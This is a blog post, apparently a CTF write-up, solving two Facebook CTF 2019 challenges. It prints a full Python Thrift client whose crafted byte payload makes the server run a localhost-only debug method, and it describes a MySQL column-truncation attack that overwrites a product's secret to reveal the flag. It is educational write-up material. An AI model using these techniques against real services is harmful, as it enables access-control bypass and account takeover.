---
layout: post
title: Facebook CTF 2019
date: '2019-06-02T18:22:00.000-07:00'
author: Keramas
tags: 
modified_time: '2019-06-02T18:50:14.889-07:00'
thumbnail: https://1.bp.blogspot.com/-5qkkfEMnfwE/XPRtZQYQmmI/AAAAAAAAA60/F3_lA9QCp1s7CDntYOjG8QRWuWh_4AKXgCLcBGAs/s72-c/facebook-ctf.jpg
blogger_id: tag:blogger.com,1999:blog-4206503528938574504.post-6628400234308534802
blogger_orig_url: https://k3ramas.blogspot.com/2019/06/facebook-ctf-2019.html
---

I spent nearly all weekend bashing my head against the wall trying to solve the challenges developed by the masterminds behind the Facebook CTF. Though I only managed to solve a couple, I felt decently accomplished and had a lot of fun.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-5qkkfEMnfwE/XPRtZQYQmmI/AAAAAAAAA60/F3_lA9QCp1s7CDntYOjG8QRWuWh_4AKXgCLcBGAs/s1600/facebook-ctf.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="450" data-original-width="1280" height="224" src="https://1.bp.blogspot.com/-5qkkfEMnfwE/XPRtZQYQmmI/AAAAAAAAA60/F3_lA9QCp1s7CDntYOjG8QRWuWh_4AKXgCLcBGAs/s640/facebook-ctf.jpg" width="640" /></a></div><br /><h3>Challenge: "homework_assignment_1337"</h3><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-X-nLglqV8Uk/XPRowHn-WqI/AAAAAAAAA50/uAhj4St_TnYgGQm2vHquZnYp5UL81BUUgCEwYBhgL/s1600/homework_chal.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="363" data-original-width="503" height="230" src="https://1.bp.blogspot.com/-X-nLglqV8Uk/XPRowHn-WqI/AAAAAAAAA50/uAhj4St_TnYgGQm2vHquZnYp5UL81BUUgCEwYBhgL/s320/homework_chal.png" width="320" /></a></div><div><br /></div><div><br /></div>This was a neat challenge that involved developing a Thrift client based on a provided .thrift file in order to perform pings to the Thrift server. While pinging the server alone was not enough to get the flag, there was a nice exploit(?) to make the server dump the flag.<br /><br />I had no idea what Thrift even was, so headed to Google to read the documentation. Essentially it is a nice lightweight way for making RPCs and spinning up a client (and server for that matter) was not too difficult. Full documentation and starting guide can be found <a href="https://thrift-tutorial.readthedocs.io/en/latest/intro.html">here</a>.<br /><br />I decided to go the Python route, so first, using the provided ping.thrift file, we generate the Python code.<br /><br /><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;">thrift -r --gen py ping.thrift<br /></pre></div><br />After the Python is generated, I took the entire import header section of the PingBot-remote file that was created and made a new file for my client code, which I placed in the created gen-py directory.<br /><br />Looking at the ping.thrift file, there were two functions associated with the PingBot service: ping and pingdebug. The former will just ping a given host, while the latter was said to be restricted to localhost execution only.<br /><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;">service PingBot {<br /><br />  <span style="color: #888888;">/**</span><br /><span style="color: #888888;">   * A method definition looks like C code. It has a return type, arguments,</span><br /><span style="color: #888888;">   * and optionally a list of exceptions that it may throw. Note that argument</span><br /><span style="color: #888888;">   * lists and exception lists are specified using the exact same syntax as</span><br /><span style="color: #888888;">   * field lists in struct or exception definitions.</span><br /><span style="color: #888888;">   */</span><br /><br /><br />  <span style="color: #888888;">// As part of your homework you should call this method.</span><br />  <span style="color: #888888;">// Ping the server I set up by correctly setting the proto and host fields</span><br />  <span style="color: #888888;">// within the Ping structure.</span><br />  Pong ping(<span style="color: #0000dd; font-weight: bold;">1</span><span style="color: #333333;">:</span>Ping input),<br /><br /><br /><br />  <span style="color: #888888;">// You do not have to call this method as part of your homework.</span><br />  <span style="color: #888888;">// I added this to check people's work, it is my admin interface so to speak.</span><br />  <span style="color: #888888;">// It should only work for localhost connections either way, if your client</span><br />  <span style="color: #888888;">// tries to call it, your connection will be denied, hahaha!</span><br />  PongDebug pingdebug(<span style="color: #0000dd; font-weight: bold;">1</span><span style="color: #333333;">:</span>Debug dummy),<br /><br />}<br /></pre></div><br />Due to the comment, I surmised that the real goal here was to find a way to call pingdebug and trick the system into thinking it was being called from localhost, which should *hopefully* reveal the flag.<br /><br />After a bit of struggle and exploration of all the dependency Python files, I managed to work out how to successfully ping the server.<br /><br /><a href="https://1.bp.blogspot.com/-1JAWz7aLzd8/XPRownITD5I/AAAAAAAAA5g/7HJ08VmWd84jRhy4OQgZfMEPYV-U68ELACLcBGAs/s1600/ping_nodata.png" imageanchor="1" style="clear: left; display: inline !important; margin-bottom: 1em; margin-right: 1em; text-align: center;"><img border="0" data-original-height="254" data-original-width="654" src="https://1.bp.blogspot.com/-1JAWz7aLzd8/XPRownITD5I/AAAAAAAAA5g/7HJ08VmWd84jRhy4OQgZfMEPYV-U68ELACLcBGAs/s1600/ping_nodata.png" /></a><br /><br /><div class="separator" style="clear: both; text-align: center;"></div>Seeing that there is a data field and knowing that 'data' can be passed as an argument for the ping function, this seems interesting and will likely be where our flag is output.<br /><br />Pressing on, I attempted to make a pingdebug call, but was rejected, confirming that this function is indeed restricted.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-LaKLrx6Hh9k/XPRovhrOCII/AAAAAAAAA58/17nusR9p9yYvSFX-ohIFYkz3AGAQhxAJgCEwYBhgL/s1600/fail_localhostblock.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" data-original-height="199" data-original-width="1130" height="112" src="https://1.bp.blogspot.com/-LaKLrx6Hh9k/XPRovhrOCII/AAAAAAAAA58/17nusR9p9yYvSFX-ohIFYkz3AGAQhxAJgCEwYBhgL/s640/fail_localhostblock.png" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"></div><br /><div class="separator" style="clear: both; text-align: center;"></div>Based on the .thrift file, the data variable is set to be a binary array, and to probe a bit, I initially set data to be bytearray(64) and other integer values to see if anything was returned. Sure enough, the data field was populated with a bunch of hex when pinging the server.<br /><br /><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-_GNlwTJhDTA/XPRqdnjoqCI/AAAAAAAAA6U/25PNNI_mQvYMcZeaR30RXH5w7PPNIGPtACEwYBhgL/s1600/unknown_function.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" data-original-height="161" data-original-width="827" height="124" src="https://1.bp.blogspot.com/-_GNlwTJhDTA/XPRqdnjoqCI/AAAAAAAAA6U/25PNNI_mQvYMcZeaR30RXH5w7PPNIGPtACEwYBhgL/s640/unknown_function.png" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"></div><br />This output is interesting and seems to be waiting for some kind of input to execute indicated by the "Unknown function" string present. It took a bit of trial and error to figure out what to do here, but converting the strings "pingdebug" and "localhost:9090" to hex and placing them in position, it was possible to send that back to the server and get the flag.<br /><br />Final code (cleaned up to print out the flag neatly):<br /><br /><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #888888;">#!/usr/bin/env python</span><br /><br /><span style="color: #008800; font-weight: bold;">import</span> <span style="color: #0e84b5; font-weight: bold;">sys</span><br /><span style="color: #008800; font-weight: bold;">import</span> <span style="color: #0e84b5; font-weight: bold;">pprint</span><br /><span style="color: #008800; font-weight: bold;">from</span> <span style="color: #0e84b5; font-weight: bold;">thrift.transport</span> <span style="color: #008800; font-weight: bold;">import</span> TTransport, TSocket, TSSLSocket, THttpClient<br /><span style="color: #008800; font-weight: bold;">from</span> <span style="color: #0e84b5; font-weight: bold;">thrift.protocol.TBinaryProtocol</span> <span style="color: #008800; font-weight: bold;">import</span> TBinaryProtocol<br /><span style="color: #008800; font-weight: bold;">from</span> <span style="color: #0e84b5; font-weight: bold;">thrift</span> <span style="color: #008800; font-weight: bold;">import</span> Thrift<br /><span style="color: #008800; font-weight: bold;">from</span> <span style="color: #0e84b5; font-weight: bold;">ping</span> <span style="color: #008800; font-weight: bold;">import</span> PingBot<br /><span style="color: #008800; font-weight: bold;">from</span> <span style="color: #0e84b5; font-weight: bold;">ping.ttypes</span> <span style="color: #008800; font-weight: bold;">import</span> <span style="color: #333333;">*</span><br /><br />socket <span style="color: #333333;">=</span> TSocket<span style="color: #333333;">.</span>TSocket(<span style="background-color: #fff0f0;">'challenges.fbctf.com'</span>, <span style="color: #0000dd; font-weight: bold;">9090</span>)<br />transport <span style="color: #333333;">=</span> TTransport<span style="color: #333333;">.</span>TBufferedTransport(socket)<br />protocol <span style="color: #333333;">=</span> TBinaryProtocol(transport)<br />client <span style="color: #333333;">=</span> PingBot<span style="color: #333333;">.</span>Client(protocol)<br /><br />transport<span style="color: #333333;">.</span>open()<br /><span style="color: #008800; font-weight: bold;">print</span> <span style="background-color: #fff0f0;">"[*] Opening connection to Thrift server@challenges.fbctf.com:9090"</span><br /><br />host <span style="color: #333333;">=</span> <span style="background-color: #fff0f0;">'localhost:9090'</span><br />proto <span style="color: #333333;">=</span> <span style="color: #0000dd; font-weight: bold;">1</span><br />data <span style="color: #333333;">=</span> <span style="background-color: #fff0f0;">'</span><span style="background-color: #fff0f0; color: #666666; font-weight: bold;">\x80\x01\x00\x01\x00\x00\x00\x09\x70\x69\x6e\x67\x64\x65\x62\x75\x67\x00\x00\x00\x00\x0c\x00\x01\x08\x00\x01\x00\x00\x00\x02\x0b\x00\x02\x00\x00\x00\x0e\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74\x3a\x39\x30\x39\x30\x00\x00</span><span style="background-color: #fff0f0;">'</span> <br /><br /><span style="color: #008800; font-weight: bold;">print</span> <span style="background-color: #fff0f0;">"[*] Pinging </span><span style="background-color: #eeeeee;">%s</span><span style="background-color: #fff0f0;">"</span> <span style="color: #333333;">%</span> host<br /><span style="color: #008800; font-weight: bold;">print</span> <span style="background-color: #fff0f0;">"------------------------------"</span><br /><span style="color: #008800; font-weight: bold;">try</span>:<br />   <span style="color: #008800; font-weight: bold;">print</span> <span style="background-color: #fff0f0;">"[*]Raw data:"</span><br />   <span style="color: #008800; font-weight: bold;">print</span>((client<span style="color: #333333;">.</span>ping(Ping(proto,host,data))))<br /><br />   <span style="color: #008800; font-weight: bold;">print</span> <span style="background-color: #fff0f0;">"</span><span style="background-color: #fff0f0; color: #666666; font-weight: bold;">\n</span><span style="background-color: #fff0f0;">"</span><span style="color: #333333;">+</span> <span style="background-color: #fff0f0;">"[!]Flag = "</span> <span style="color: #333333;">+</span> <span style="color: #007020;">str</span>((client<span style="color: #333333;">.</span>ping(Ping(proto,host,data))))<span style="color: #333333;">.</span>split(<span style="background-color: #fff0f0;">'"'</span>)[<span style="color: #0000dd; font-weight: bold;">1</span>]<br /><br /><span style="color: #008800; font-weight: bold;">except</span> Thrift<span style="color: #333333;">.</span>TException, tx:<br />   <span style="color: #008800; font-weight: bold;">print</span> <span style="background-color: #fff0f0;">"[x] "</span> <span style="color: #333333;">+</span> tx<span style="color: #333333;">.</span>message<br />   sys<span style="color: #333333;">.</span>exit(<span style="color: #0000dd; font-weight: bold;">0</span>)  <br /><span style="color: #008800; font-weight: bold;">print</span> <span style="background-color: #fff0f0;">"------------------------------"</span><br /><br />transport<span style="color: #333333;">.</span>close()<br /><span style="color: #008800; font-weight: bold;">print</span> <span style="background-color: #fff0f0;">"[*] Disconnected from Thrift server."</span><br /></pre></div><br /><br /><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-sDqTPhuJ6s0/XPRovmBIP5I/AAAAAAAAA54/nkhX562XrmYK7YafeE2_39FeUKQd1NvJwCEwYBhgL/s1600/final_flag_thrift.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" data-original-height="237" data-original-width="1126" height="132" src="https://1.bp.blogspot.com/-sDqTPhuJ6s0/XPRovmBIP5I/AAAAAAAAA54/nkhX562XrmYK7YafeE2_39FeUKQd1NvJwCEwYBhgL/s640/final_flag_thrift.png" width="640" /></a></div><br /><br /><br /><br /><h3><br /></h3><h3>Challenge: "Product Manager"</h3><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-IsGyHJeBWUg/XPRow2ToGWI/AAAAAAAAA6A/2nJW_S67vCsLTi4upDsVHTA2e2dJ53EKwCEwYBhgL/s1600/products_manager.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="411" data-original-width="473" height="278" src="https://1.bp.blogspot.com/-IsGyHJeBWUg/XPRow2ToGWI/AAAAAAAAA6A/2nJW_S67vCsLTi4upDsVHTA2e2dJ53EKwCEwYBhgL/s320/products_manager.png" width="320" /></a></div><div><br /></div><div><br /></div>This was a fun little web challenge. The application allows for the addition of products that you list with a special password, and it is also possible to view these products by specifying the product name and password.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-UpfSxBayJLA/XPRowsd1B9I/AAAAAAAAA6I/XTcpU5WAC3spxt_n4KrQ0h_xE8Z7F-YBACEwYBhgL/s1600/product_home.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="368" data-original-width="718" height="328" src="https://1.bp.blogspot.com/-UpfSxBayJLA/XPRowsd1B9I/AAAAAAAAA6I/XTcpU5WAC3spxt_n4KrQ0h_xE8Z7F-YBACEwYBhgL/s1600/product_home.png" width="640" /></a></div><br /><br />I starting attacking it for quite a bit before I realized that the source code for the page was given. Initially, I thought for sure it would be some form of a second order SQL injection, but after reviewing the source code for the db.php file, I noticed something interesting:<br /><br /><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #557799;"><br /><br /><span style="color: #888888;">/*</span><br /><span style="color: #888888;">CREATE TABLE products (</span><br /><span style="color: #888888;">  name char(64),</span><br /><span style="color: #888888;">  secret char(64),</span><br /><span style="color: #888888;">  description varchar(250)</span><br /><span style="color: #888888;">);</span><br /><br /><span style="color: #888888;">INSERT INTO products VALUES('facebook', sha256(....), 'FLAG_HERE');</span><br /><span style="color: #888888;">INSERT INTO products VALUES('messenger', sha256(....), ....);</span><br /><span style="color: #888888;">INSERT INTO products VALUES('instagram', sha256(....), ....);</span><br /><span style="color: #888888;">INSERT INTO products VALUES('whatsapp', sha256(....), ....);</span><br /><span style="color: #888888;">INSERT INTO products VALUES('oculus-rift', sha256(....), ....);</span><br /><span style="color: #888888;">*/</span><br /><span style="color: #007020;">error_reporting</span>(<span style="color: #0000dd; font-weight: bold;">0</span>);<br /><span style="color: #008800; font-weight: bold;">require_once</span>(<span style="background-color: #fff0f0;">"config.php"</span>); <span style="color: #888888;">// DB config</span><br /></span></pre></div><br />First, we know where the flag is going to be. It's a description for the 'facebook' product, but to see it we will need the secret password. Or do we? Loooking at the CREATE TABLE products function, there is a limited buffer space given, so it is possible to perform a SQL truncation attack due to how mySQL handles spaces.<br /><br /><div class="separator" style="clear: both; text-align: center;"></div><br /><div class="separator" style="clear: both; text-align: center;"></div>For the product name, I entered "facebook" followed by a bunch of spaces and then just arbitrary text, which was "adminf", and then set an arbitrary password. (Description text was left over from my prodding...)<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-RvQIpt3m8c4/XPR1CKgq_9I/AAAAAAAAA7M/na4MZjyIIS42k5oxv9bJDNZEXKCYswmkACLcBGAs/s1600/add_req.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="265" data-original-width="627" height="270" src="https://1.bp.blogspot.com/-RvQIpt3m8c4/XPR1CKgq_9I/AAAAAAAAA7M/na4MZjyIIS42k5oxv9bJDNZEXKCYswmkACLcBGAs/s640/add_req.png" width="640" /></a></div><br /><br />What this will do is make the server cut off extraneous characters that were over the buffer and then truncate the remaining empty spaces which results in the product name being "facebook". It also changes the product's password to what we input allowing access to this product's page.<br /><br />Inputting 'facebook' for the product, and then our secret password, we can browse the product page which reveals the flag.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-s_FhPGdM1i8/XPRoxU3iuPI/AAAAAAAAA6A/u8BDyPozDpQYTdBzy9AMT3CLjWYFd7TvQCEwYBhgL/s1600/truncation_response.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="544" data-original-width="865" height="402" src="https://1.bp.blogspot.com/-s_FhPGdM1i8/XPRoxU3iuPI/AAAAAAAAA6A/u8BDyPozDpQYTdBzy9AMT3CLjWYFd7TvQCEwYBhgL/s640/truncation_response.png" width="640" /></a></div><br />